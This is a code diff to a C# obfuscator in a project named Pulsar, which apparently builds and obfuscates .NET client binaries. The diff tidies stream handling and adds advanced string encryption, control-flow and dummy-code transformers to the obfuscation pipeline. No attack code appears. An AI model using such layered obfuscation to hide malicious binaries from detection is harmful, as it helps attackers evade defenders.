@@ -1,12 +1,8 @@
-﻿using dnlib.DotNet;
+using dnlib.DotNet;
 using Pulsar.Server.Build.Obfuscator.Transformers;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Net;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Pulsar.Server.Build.Obfuscator
 {
@@ -36,13 +32,9 @@ namespace Pulsar.Server.Build.Obfuscator
         {
             MemoryStream stream = new MemoryStream();
             module.Write(stream);
-
-            long size = stream.Position;
             stream.Position = 0;
-            byte[] data = new byte[size];
-            stream.Read(data, 0, (int)size);
-
-
+            byte[] data = new byte[stream.Length];
+            stream.Read(data, 0, data.Length);
             return data;
         }
 
@@ -54,10 +46,14 @@ namespace Pulsar.Server.Build.Obfuscator
         public void Obfuscate()
         {
             Console.WriteLine("Obfuscating....");
+
             List<ITransformer> transformers = new List<ITransformer>()
             {
                 new RenamerTransformer(),
-                new StringEncryptionTransformer()
+                new StringEncryptionTransformer(),
+                new AdvancedStringEncryptionTransformer(),
+                new ControlFlowTransformer(),
+                new DummyCodeTransformer()
             };
 
             foreach (ITransformer transformer in transformers)
